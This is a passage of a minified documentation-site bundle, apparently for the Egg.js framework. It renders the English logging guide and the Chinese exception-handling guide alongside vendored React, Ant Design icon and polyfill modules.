",r.a.createElement(l["Link"],{to:"./cluster-and-ipc"},"Multi-process"),"."),r.a.createElement("h2",{id:"encoding"},r.a.createElement(l["AnchorLink"],{to:"#encoding","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Encoding"),r.a.createElement("p",null,"The default encoding setting(",r.a.createElement("code",null,"utf-8"),") can be changed via ",r.a.createElement("code",null,"encoding")," in config:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  encoding: 'gbk',\n};",lang:"js"}),r.a.createElement("h2",{id:"format"},r.a.createElement(l["AnchorLink"],{to:"#format","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Format"),r.a.createElement("p",null,"Use JSON as the output log format, make it easier to parse."),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  outputJSON: true,\n};",lang:"js"}),r.a.createElement("h2",{id:"log-level"},r.a.createElement(l["AnchorLink"],{to:"#log-level","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Log Level"),r.a.createElement("p",null,"Logs are designed in 5 levels, including ",r.a.createElement("code",null,"NONE"),", ",r.a.createElement("code",null,"DEBUG"),", ",r.a.createElement("code",null,"INFO"),", ",r.a.createElement("code",null,"WARN")," and ",r.a.createElement("code",null,"ERROR"),". For inspecting in development, they will also be written into files and printed into terminal as well."),r.a.createElement("h3",{id:"levels"},r.a.createElement(l["AnchorLink"],{to:"#levels","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Levels"),r.a.createElement("p",null,"In production environment, Egg will only write logs with level ",r.a.createElement("code",null,"INFO")," and higher, this means ",r.a.createElement("code",null,"NONE")," and ",r.a.createElement("code",null,"DEBUG")," information will be ignored in log files."),r.a.createElement("p",null,"If you want to change logger's default output level, modify in the config as follow:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  level: 'DEBUG', // logs in all level will be written into files\n};",lang:"js"}),r.a.createElement("p",null,"Stop writing logs in all levels:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  level: 'NONE',\n};",lang:"js"}),r.a.createElement("h4",{id:"debug-log-in-production-environment"},r.a.createElement(l["AnchorLink"],{to:"#debug-log-in-production-environment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debug Log in Production Environment"),r.a.createElement("p",null,"To avoid some plugin's DEBUG logs printing in the production environment causing performance problems, the production environment prohibits printing DEBUG-level logs by default. If there is a need to print DEBUG logs for debugging in the production environment, you need to set ",r.a.createElement("code",null,"allowDebugAtProd")," configuration to ",r.a.createElement("code",null,"true"),"."),r.a.createElement(o["a"],{code:"// config/config.prod.js\nexports.logger = {\n  level: 'DEBUG',\n  allowDebugAtProd: true,\n};",lang:"js"}),r.a.createElement("h3",{id:"in-terminal"},r.a.createElement(l["AnchorLink"],{to:"#in-terminal","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"In Terminal"),r.a.createElement("p",null,"By default, Egg will only print out ",r.a.createElement("code",null,"INFO"),", ",r.a.createElement("code",null,"WARN")," and ",r.a.createElement("code",null,"ERROR")," in terminal. (Notice: It only works on ",r.a.createElement("code",null,"local")," and ",r.a.createElement("code",null,"unittest")," env)"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"logger.consoleLevel"),": The logger level in terminal. It defaults to ",r.a.createElement("code",null,"INFO"),", though it defaults to ",r.a.createElement("code",null,"WARN")," on both ",r.a.createElement("code",null,"local")," and ",r.a.createElement("code",null,"unittest")," environments.")),r.a.createElement("p",null,"Similarly, it can be changed in the following ways:"),r.a.createElement("p",null,"Print logs in all levels:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  consoleLevel: 'DEBUG',\n};",lang:"js"}),r.a.createElement("p",null,"Stop printing logs in all levels:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  consoleLevel: 'NONE',\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Base on performance considerations, console logger will be disabled after app ready at prod mode. however, you can enable it by config. (",r.a.createElement("strong",null,"Not Recommended"),")")),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  disableConsoleAfterReady: false,\n};",lang:"js"}),r.a.createElement("h2",{id:"create-your-logger"},r.a.createElement(l["AnchorLink"],{to:"#create-your-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Create Your Logger"),r.a.createElement("h3",{id:"customized"},r.a.createElement(l["AnchorLink"],{to:"#customized","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Customized"),r.a.createElement("p",null,"For common scenarios, ",r.a.createElement("strong",null,"it's unnecessary to create new logger"),", because too many loggers will make them hard to be managed for later debugging."),r.a.createElement("p",null,"The logger you create can be declared in config:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    customLogger: {\n      xxLogger: {\n        file: path.join(appInfo.root, 'logs/xx.log'),\n      },\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"Now, you can get loggers via ",r.a.createElement("code",null,"app.getLogger('xxLogger')")," or ",r.a.createElement("code",null,"ctx.getLogger('xxLogger')"),", and the logs printed from those loggers are similar to the ones from ",r.a.createElement("code",null,"coreLogger"),"."),r.a.createElement("h3",{id:"custom-logger-formatter"},r.a.createElement(l["AnchorLink"],{to:"#custom-logger-formatter","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Custom logger formatter"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    customLogger: {\n      xxLogger: {\n        file: path.join(appInfo.root, 'logs/xx.log'),\n        formatter(meta) {\n          return `[${meta.date}] ${meta.message}`;\n        },\n        // ctx logger\n        contextFormatter(meta) {\n          return `[${meta.date}] [${meta.ctx.method} ${meta.ctx.url}] ${meta.message}`;\n        },\n      },\n    },\n  };\n};",lang:"js"}),r.a.createElement("h3",{id:"advanced"},r.a.createElement(l["AnchorLink"],{to:"#advanced","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Advanced"),r.a.createElement("p",null,"Logs will be written into files by default. Further, they will also be printed into terminal in development. But what if we need to print those into another place? Creating customized transport can take you there."),r.a.createElement("p",null,"Transport can be considered as a tunnel to transfer data in Egg. A logger contains multiple transports, for example the one by default contains ",r.a.createElement("code",null,"fileTransport")," and ",r.a.createElement("code",null,"consoleTransport"),"."),r.a.createElement("p",null,"For concrete scenario, we take ",r.a.createElement("code",null,"common-error.log")," as an example, which not only printed into files, but also sent to another remote service. At first, we can create a new transport for sending logs to remote:"),r.a.createElement(o["a"],{code:"const co = require('co');\nconst util = require('util');\nconst Transport = require('egg-logger').Transport;\n\nclass RemoteErrorTransport extends Transport {\n  // Create log() to upload logs\n  log(level, args) {\n    let log;\n    if (args[0] instanceof Error) {\n      const err = args[0];\n      log = util.format(\n        '%s: %s\\n%s\\npid: %s\\n',\n        err.name,\n        err.message,\n        err.stack,\n        process.pid,\n      );\n    } else {\n      log = util.format(...args);\n    }\n\n    this.options.app\n      .curl('http://url/to/remote/error/log/service/logs', {\n        data: log,\n        method: 'POST',\n      })\n      .catch(console.error);\n  }\n}\n\n// Transport attached to errorLogger in app.js, makes logs sync to it once those are created.\napp\n  .getLogger('errorLogger')\n  .set('remote', new RemoteErrorTransport({ level: 'ERROR', app }));",lang:"js"}),r.a.createElement("p",null,"Performance is what we always consider as important part in our services so that logs will firstly be written into memory and transferred to remote later."),r.a.createElement("h2",{id:"log-sharding"},r.a.createElement(l["AnchorLink"],{to:"#log-sharding","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Log Sharding"),r.a.createElement("p",null,"One common requirement you can find in enterprise logs is automatic log sharding, which offers a convenient way for management. Luckily, Egg takes ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logrotator"},"egg-logrotator")," as built-in solution to meet the need."),r.a.createElement("h3",{id:"daily-sharding"},r.a.createElement(l["AnchorLink"],{to:"#daily-sharding","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Daily Sharding"),r.a.createElement("p",null,"This is the default way in Egg to cut the logs into files named by ",r.a.createElement("code",null,".log.YYYY-MM-DD")," at every ",r.a.createElement("code",null,"00:00"),". For example, ",r.a.createElement("code",null,"example-app-web.log")," will be cut into files as follow, ",r.a.createElement("code",null,"example-app-web.log.YYYY-MM-DD"),"."),r.a.createElement("h3",{id:"size-sharding"},r.a.createElement(l["AnchorLink"],{to:"#size-sharding","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Size Sharding"),r.a.createElement("p",null,"The log file also can be cut into ones by size. For example, Egg will process ",r.a.createElement("code",null,"egg-web.log")," when its size reach 2G:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    logrotator: {\n      filesRotateBySize: [\n        path.join(appInfo.root, 'logs', appInfo.name, 'egg-web.log'),\n      ],\n      maxFileSize: 2 * 1024 * 1024 * 1024,\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"Logs written into ",r.a.createElement("code",null,"filesRotateBySize")," file will never be processed again by date."),r.a.createElement("h3",{id:"hourly-sharding"},r.a.createElement(l["AnchorLink"],{to:"#hourly-sharding","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Hourly Sharding"),r.a.createElement("p",null,"There is another option that the log files can be divided into small ones by hour."),r.a.createElement("p",null,"For example, we need to cut ",r.a.createElement("code",null,"common-error.log")," by hour just like following implementation."),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nconst path = require('path');\n\nmodule.exports = (appInfo) => {\n  return {\n    logrotator: {\n      filesRotateByHour: [\n        path.join(appInfo.root, 'logs', appInfo.name, 'common-error.log'),\n      ],\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"Logs written into ",r.a.createElement("code",null,"filesRotateByHour")," file will never be processed again by date."),r.a.createElement("h2",{id:"performance"},r.a.createElement(l["AnchorLink"],{to:"#performance","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Performance"),r.a.createElement("p",null,"Generally, requests are frequent events to Web services, so writing logs into disk after each event will cause more unexpected I/O. Egg takes following strategy to write logs:"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Logs will be firstly transferred into memory, and then Egg will asynchronously write them into files by second.")),r.a.createElement("p",null,"More about ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logger"},"egg-logger")," and ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logrotator"},"egg-logrotator"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},HvYB:function(e,t,n){var a,r,l,o=n("A0UU"),i=n("Xdqv"),c=n("AaXQ"),s=n("G9w8"),u=n("Tx0u"),d=n("U16M"),m=n("Yu9L"),p=o.location,h=o.setImmediate,g=o.clearImmediate,f=o.process,E=o.MessageChannel,b=o.Dispatch,v=0,y={},k="onreadystatechange",w=function(e){if(y.hasOwnProperty(e)){var t=y[e];delete y[e],t()}},x=function(e){return function(){w(e)}},j=function(e){w(e.data)},S=function(e){o.postMessage(e+"",p.protocol+"//"+p.host)};h&&g||(h=function(e){var t=[],n=1;while(arguments.length>n)t.push(arguments[n++]);return y[++v]=function(){("function"==typeof e?e:Function(e)).apply(void 0,t)},a(v),v},g=function(e){delete y[e]},"process"==c(f)?a=function(e){f.nextTick(x(e))}:b&&b.now?a=function(e){b.now(x(e))}:E&&!m?(r=new E,l=r.port2,r.port1.onmessage=j,a=s(l.postMessage,l,1)):!o.addEventListener||"function"!=typeof postMessage||o.importScripts||i(S)||"file:"===p.protocol?a=k in d("script")?function(e){u.appendChild(d("script"))[k]=function(){u.removeChild(this),w(e)}}:function(e){setTimeout(x(e),0)}:(a=S,o.addEventListener("message",j,!1))),e.exports={set:h,clear:g}},IhsX:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("XccI");a({target:"WeakMap",proto:!0,real:!0,forced:r},{deleteAll:function(){return l.apply(this,arguments)}})},Il1s:function(e,t,n){"use strict";var a=n("3Qq0"),r=n("0YMn"),l=n("qPib"),o=n("EJBU"),i=n("FU0I"),c=n.n(i),s=n("VGn1"),u=n.n(s),d=n("CUYM"),m=n("nzxN"),p=n("aH0x"),h=n("ZbH0"),g=n("4dIG");function f(e,t){Object(h["a"])(e,"[@ant-design/icons] ".concat(t))}function E(e){return"object"===Object(m["a"])(e)&&"string"===typeof e.name&&"string"===typeof e.theme&&("object"===Object(m["a"])(e.icon)||"function"===typeof e.icon)}function b(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return Object.keys(e).reduce((function(t,n){var a=e[n];switch(n){case"class":t.className=a,delete t.class;break;default:t[n]=a}return t}),{})}function v(e,t,n){return n?c.a.createElement(e.tag,Object(a["a"])(Object(a["a"])({key:t},b(e.attrs)),n),(e.children||[]).map((function(n,a){return v(n,"".concat(t,"-").concat(e.tag,"-").concat(a))}))):c.a.createElement(e.tag,Object(a["a"])({key:t},b(e.attrs)),(e.children||[]).map((function(n,a){return v(n,"".concat(t,"-").concat(e.tag,"-").concat(a))})))}function y(e){return Object(p["a"])(e)[0]}function k(e){return e?Array.isArray(e)?e:[e]:[]}var w="\n.anticon {\n  display: inline-block;\n  color: inherit;\n  font-style: normal;\n  line-height: 0;\n  text-align: center;\n  text-transform: none;\n  vertical-align: -0.125em;\n  text-rendering: optimizeLegibility;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n\n.anticon > * {\n  line-height: 1;\n}\n\n.anticon svg {\n  display: inline-block;\n}\n\n.anticon::before {\n  display: none;\n}\n\n.anticon .anticon-icon {\n  display: block;\n}\n\n.anticon[tabindex] {\n  cursor: pointer;\n}\n\n.anticon-spin::before,\n.anticon-spin {\n  display: inline-block;\n  -webkit-animation: loadingCircle 1s infinite linear;\n  animation: loadingCircle 1s infinite linear;\n}\n\n@-webkit-keyframes loadingCircle {\n  100% {\n    -webkit-transform: rotate(360deg);\n    transform: rotate(360deg);\n  }\n}\n\n@keyframes loadingCircle {\n  100% {\n    -webkit-transform: rotate(360deg);\n    transform: rotate(360deg);\n  }\n}\n",x=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:w,t=Object(i["useContext"])(d["a"]),n=t.csp;Object(i["useEffect"])((function(){Object(g["a"])(e,"@ant-design-icons",{prepend:!0,csp:n})}),[])},j=["icon","className","onClick","style","primaryColor","secondaryColor"],S={primaryColor:"#333",secondaryColor:"#E6E6E6",calculated:!1};function C(e){var t=e.primaryColor,n=e.secondaryColor;S.primaryColor=t,S.secondaryColor=n||y(t),S.calculated=!!n}function A(){return Object(a["a"])({},S)}var L=function(e){var t=e.icon,n=e.className,r=e.onClick,l=e.style,i=e.primaryColor,c=e.secondaryColor,s=Object(o["a"])(e,j),u=S;if(i&&(u={primaryColor:i,secondaryColor:c||y(i)}),x(),f(E(t),"icon should be icon definiton, but got ".concat(t)),!E(t))return null;var d=t;return d&&"function"===typeof d.icon&&(d=Object(a["a"])(Object(a["a"])({},d),{},{icon:d.icon(u.primaryColor,u.secondaryColor)})),v(d.icon,"svg-".concat(d.name),Object(a["a"])({className:n,onClick:r,style:l,"data-icon":d.name,width:"1em",height:"1em",fill:"currentColor","aria-hidden":"true"},s))};L.displayName="IconReact",L.getTwoToneColors=A,L.setTwoToneColors=C;var T=L;function N(e){var t=k(e),n=Object(r["a"])(t,2),a=n[0],l=n[1];return T.setTwoToneColors({primaryColor:a,secondaryColor:l})}function O(){var e=T.getTwoToneColors();return e.calculated?[e.primaryColor,e.secondaryColor]:e.primaryColor}var I=["className","icon","spin","rotate","tabIndex","onClick","twoToneColor"];N("#1890ff");var P=i["forwardRef"]((function(e,t){var n,c=e.className,s=e.icon,m=e.spin,p=e.rotate,h=e.tabIndex,g=e.onClick,f=e.twoToneColor,E=Object(o["a"])(e,I),b=i["useContext"](d["a"]),v=b.prefixCls,y=void 0===v?"anticon":v,w=b.rootClassName,x=u()(w,y,(n={},Object(l["a"])(n,"".concat(y,"-").concat(s.name),!!s.name),Object(l["a"])(n,"".concat(y,"-spin"),!!m||"loading"===s.name),n),c),j=h;void 0===j&&g&&(j=-1);var S=p?{msTransform:"rotate(".concat(p,"deg)"),transform:"rotate(".concat(p,"deg)")}:void 0,C=k(f),A=Object(r["a"])(C,2),L=A[0],N=A[1];return i["createElement"]("span",Object(a["a"])(Object(a["a"])({role:"img","aria-label":s.name},E),{},{ref:t,tabIndex:j,onClick:g,className:x}),i["createElement"](T,{icon:s,primaryColor:L,secondaryColor:N,style:S}))}));P.displayName="AntdIcon",P.getTwoToneColor=O,P.setTwoToneColor=N;t["a"]=P},Io2v:function(e,t,n){var a=n("u9el");a("Float64",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},IqcE:function(e,t,n){"use strict";var a="function"===typeof Symbol&&Symbol["for"],r=a?Symbol["for"]("react.element"):60103,l=a?Symbol["for"]("react.portal"):60106,o=a?Symbol["for"]("react.fragment"):60107,i=a?Symbol["for"]("react.strict_mode"):60108,c=a?Symbol["for"]("react.profiler"):60114,s=a?Symbol["for"]("react.provider"):60109,u=a?Symbol["for"]("react.context"):60110,d=a?Symbol["for"]("react.async_mode"):60111,m=a?Symbol["for"]("react.concurrent_mode"):60111,p=a?Symbol["for"]("react.forward_ref"):60112,h=a?Symbol["for"]("react.suspense"):60113,g=a?Symbol["for"]("react.suspense_list"):60120,f=a?Symbol["for"]("react.memo"):60115,E=a?Symbol["for"]("react.lazy"):60116,b=a?Symbol["for"]("react.block"):60121,v=a?Symbol["for"]("react.fundamental"):60117,y=a?Symbol["for"]("react.responder"):60118,k=a?Symbol["for"]("react.scope"):60119;function w(e){if("object"===typeof e&&null!==e){var t=e.$$typeof;switch(t){case r:switch(e=e.type,e){case d:case m:case o:case c:case i:case h:return e;default:switch(e=e&&e.$$typeof,e){case u:case p:case E:case f:case s:return e;default:return t}}case l:return t}}}function x(e){return w(e)===m}t.AsyncMode=d,t.ConcurrentMode=m,t.ContextConsumer=u,t.ContextProvider=s,t.Element=r,t.ForwardRef=p,t.Fragment=o,t.Lazy=E,t.Memo=f,t.Portal=l,t.Profiler=c,t.StrictMode=i,t.Suspense=h,t.isAsyncMode=function(e){return x(e)||w(e)===d},t.isConcurrentMode=x,t.isContextConsumer=function(e){return w(e)===u},t.isContextProvider=function(e){return w(e)===s},t.isElement=function(e){return"object"===typeof e&&null!==e&&e.$$typeof===r},t.isForwardRef=function(e){return w(e)===p},t.isFragment=function(e){return w(e)===o},t.isLazy=function(e){return w(e)===E},t.isMemo=function(e){return w(e)===f},t.isPortal=function(e){return w(e)===l},t.isProfiler=function(e){return w(e)===c},t.isStrictMode=function(e){return w(e)===i},t.isSuspense=function(e){return w(e)===h},t.isValidElementType=function(e){return"string"===typeof e||"function"===typeof e||e===o||e===m||e===c||e===i||e===h||e===g||"object"===typeof e&&null!==e&&(e.$$typeof===E||e.$$typeof===f||e.$$typeof===s||e.$$typeof===u||e.$$typeof===p||e.$$typeof===v||e.$$typeof===y||e.$$typeof===k||e.$$typeof===b)},t.typeOf=w},IsRm:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("G9w8"),i=n("AOzO"),c=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{find:function(e){var t=l(this),n=i(t),a=o(e,arguments.length>1?arguments[1]:void 0,3);return c(n,(function(e,n){if(a(n,e,t))return c.stop(n)}),void 0,!0,!0).result}})},IwpU:function(e,t,n){var a=n("0mt+"),r=n("MwLW").values;a({target:"Object",stat:!0},{values:function(e){return r(e)}})},J0pO:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"\u5f02\u5e38\u6355\u83b7"},r.a.createElement(l["AnchorLink"],{to:"#\u5f02\u5e38\u6355\u83b7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f02\u5e38\u6355\u83b7"),r.a.createElement("p",null,"\u5f97\u76ca\u4e8e\u6846\u67b6\u652f\u6301\u7684\u5f02\u6b65\u7f16\u7a0b\u6a21\u578b\uff0c\u9519\u8bef\u5b8c\u5168\u53ef\u4ee5\u7528 ",r.a.createElement("code",null,"try catch")," \u6765\u6355\u83b7\u3002\u5728\u7f16\u5199\u5e94\u7528\u4ee3\u7801\u65f6\uff0c\u6240\u6709\u5730\u65b9\u90fd\u53ef\u4ee5\u76f4\u63a5\u7528 ",r.a.createElement("code",null,"try catch")," \u6765\u6355\u83b7\u5f02\u5e38\u3002"),r.a.createElement(o["a"],{code:"// app/service/test.js\ntry {\n  const res = await this.ctx.curl('http://eggjs.com/api/echo', {\n    dataType: 'json',\n  });\n  if (res.status !== 200) throw new Error('response status is not 200');\n  return res.data;\n} catch (err) {\n  this.logger.error(err);\n  return {};\n}",lang:"js"}),r.a.createElement("p",null,"\u6309\u7167\u6b63\u5e38\u4ee3\u7801\u5199\u6cd5\uff0c\u6240\u6709\u7684\u5f02\u5e38\u90fd\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u884c\u6355\u83b7\u5e76\u5904\u7406\uff0c\u4f46\u662f\u4e00\u5b9a\u8981\u6ce8\u610f\u4e00\u4e9b\u7279\u6b8a\u7684\u5199\u6cd5\u53ef\u80fd\u5e26\u6765\u7684\u95ee\u9898\u3002\u6253\u4e00\u4e2a\u4e0d\u592a\u6b63\u5f0f\u7684\u6bd4\u65b9\uff0c\u6211\u4eec\u7684\u4ee3\u7801\u5168\u90e8\u90fd\u5728\u4e00\u4e2a\u5f02\u6b65\u8c03\u7528\u94fe\u4e0a\uff0c\u6240\u6709\u7684\u5f02\u6b65\u64cd\u4f5c\u90fd\u901a\u8fc7 await \u4e32\u63a5\u8d77\u6765\u4e86\uff0c\u4f46\u662f\u53ea\u8981\u6709\u4e00\u4e2a\u5730\u65b9\u8df3\u51fa\u4e86\u5f02\u6b65\u8c03\u7528\u94fe\uff0c\u5f02\u5e38\u5c31\u6355\u83b7\u4e0d\u5230\u4e86\u3002"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nclass HomeController extends Controller {\n  async buy() {\n    const request = {};\n    const config = await ctx.service.trade.buy(request);\n    // \u4e0b\u5355\u540e\u9700\u8981\u8fdb\u884c\u4e00\u6b21\u6838\u5bf9\uff0c\u4e14\u4e0d\u963b\u585e\u5f53\u524d\u8bf7\u6c42\n    setImmediate(() => {\n      ctx.service.trade.check(request).catch((err) => ctx.logger.error(err));\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5728\u8fd9\u4e2a\u573a\u666f\u4e2d\uff0c\u5982\u679c ",r.a.createElement("code",null,"service.trade.check")," \u65b9\u6cd5\u4e2d\u4ee3\u7801\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u6267\u884c\u65f6\u629b\u51fa\u4e86\u5f02\u5e38\uff0c\u5c3d\u7ba1\u6846\u67b6\u4f1a\u5728\u6700\u5916\u5c42\u901a\u8fc7 ",r.a.createElement("code",null,"try catch")," \u7edf\u4e00\u6355\u83b7\u9519\u8bef\uff0c\u4f46\u662f\u7531\u4e8e ",r.a.createElement("code",null,"setImmediate")," \u4e2d\u7684\u4ee3\u7801\u300e\u8df3\u51fa\u300f\u4e86\u5f02\u6b65\u94fe\uff0c\u5b83\u91cc\u9762\u7684\u9519\u8bef\u5c31\u65e0\u6cd5\u88ab\u6355\u6349\u5230\u4e86\u3002\u56e0\u6b64\u5728\u7f16\u5199\u7c7b\u4f3c\u4ee3\u7801\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u6ce8\u610f\u3002"),r.a.createElement("p",null,"\u5f53\u7136\uff0c\u6846\u67b6\u4e5f\u8003\u8651\u5230\u4e86\u8fd9\u7c7b\u573a\u666f\uff0c\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"ctx.runInBackground(scope)")," \u8f85\u52a9\u65b9\u6cd5\uff0c\u901a\u8fc7\u5b83\u53c8\u5305\u88c5\u4e86\u4e00\u4e2a\u5f02\u6b65\u94fe\uff0c\u6240\u6709\u5728\u8fd9\u4e2a scope \u91cc\u9762\u7684\u9519\u8bef\u90fd\u4f1a\u7edf\u4e00\u6355\u83b7\u3002"),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async buy() {\n    const request = {};\n    const config = await ctx.service.trade.buy(request);\n    // \u4e0b\u5355\u540e\u9700\u8981\u8fdb\u884c\u4e00\u6b21\u6838\u5bf9\uff0c\u4e14\u4e0d\u963b\u585e\u5f53\u524d\u8bf7\u6c42\n    ctx.runInBackground(async () => {\n      // \u8fd9\u91cc\u9762\u7684\u5f02\u5e38\u90fd\u4f1a\u7edf\u7edf\u88ab Backgroud \u6355\u83b7\u6389\uff0c\u5e76\u6253\u5370\u9519\u8bef\u65e5\u5fd7\n      await ctx.service.trade.check(request);\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u4e3a\u4e86\u4fdd\u8bc1\u5f02\u5e38\u53ef\u8ffd\u8e2a\uff0c\u5fc5\u987b\u4fdd\u8bc1\u6240\u6709\u629b\u51fa\u7684\u5f02\u5e38\u90fd\u662f Error \u7c7b\u578b\uff0c\u56e0\u4e3a\u53ea\u6709 Error \u7c7b\u578b\u624d\u4f1a\u5e26\u4e0a\u5806\u6808\u4fe1\u606f\uff0c\u5b9a\u4f4d\u5230\u95ee\u9898\u3002")),r.a.createElement("h2",{id:"\u6846\u67b6\u5c42\u7edf\u4e00\u5f02\u5e38\u5904\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u5c42\u7edf\u4e00\u5f02\u5e38\u5904\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u5c42\u7edf\u4e00\u5f02\u5e38\u5904\u7406"),r.a.createElement("p",null,"\u6846\u67b6\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-onerror"},"onerror")," \u63d2\u4ef6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u9519\u8bef\u5904\u7406\u673a\u5236\u3002\u5bf9\u4e00\u4e2a\u8bf7\u6c42\u7684\u6240\u6709\u5904\u7406\u65b9\u6cd5\uff08Middleware\u3001Controller\u3001Service\uff09\u4e2d\u629b\u51fa\u7684\u4efb\u4f55\u5f02\u5e38\u90fd\u4f1a\u88ab\u5b83\u6355\u83b7\uff0c\u5e76\u81ea\u52a8\u6839\u636e\u8bf7\u6c42\u60f3\u8981\u83b7\u53d6\u7684\u7c7b\u578b\u8fd4\u56de\u4e0d\u540c\u7c7b\u578b\u7684\u9519\u8bef\uff08\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://tools.ietf.org/html/rfc7231#section-5.3.2"},"Content Negotiation"),"\uff09\u3002"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"\u8bf7\u6c42\u9700\u6c42\u7684\u683c\u5f0f"),r.a.createElement("th",null,"\u73af\u5883"),r.a.createElement("th",null,"errorPageUrl \u662f\u5426\u914d\u7f6e"),r.a.createElement("th",null,"\u8fd4\u56de\u5185\u5bb9"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"HTML & TEXT"),r.a.createElement("td",null,"local & unittest"),r.a.createElement("td",null,"-"),r.a.createElement("td",null,"onerror \u81ea\u5e26\u7684\u9519\u8bef\u9875\u9762\uff0c\u5c55\u793a\u8be6\u7ec6\u7684\u9519\u8bef\u4fe1\u606f")),r.a.createElement("tr",null,r.a.createElement("td",null,"HTML & TEXT"),r.a.createElement("td",null,"\u5176\u4ed6"),r.a.createElement("td",null,"\u662f"),r.a.createElement("td",null,"\u91cd\u5b9a\u5411\u5230 errorPageUrl")),r.a.createElement("tr",null,r.a.createElement("td",null,"HTML & TEXT"),r.a.createElement("td",null,"\u5176\u4ed6"),r.a.createElement("td",null,"\u5426"),r.a.createElement("td",null,"onerror \u81ea\u5e26\u7684\u6ca1\u6709\u9519\u8bef\u4fe1\u606f\u7684\u7b80\u5355\u9519\u8bef\u9875\uff08\u4e0d\u63a8\u8350\uff09")),r.a.createElement("tr",null,r.a.createElement("td",null,"JSON & JSONP"),r.a.createElement("td",null,"local & unittest"),r.a.createElement("td",null,"-"),r.a.createElement("td",null,"JSON \u5bf9\u8c61\u6216\u5bf9\u5e94\u7684 JSONP \u683c\u5f0f\u54cd\u5e94\uff0c\u5e26\u8be6\u7ec6\u7684\u9519\u8bef\u4fe1\u606f")),r.a.createElement("tr",null,r.a.createElement("td",null,"JSON & JSONP"),r.a.createElement("td",null,"\u5176\u4ed6"),r.a.createElement("td",null,"-"),r.a.createElement("td",null,"JSON \u5bf9\u8c61\u6216\u5bf9\u5e94\u7684 JSONP 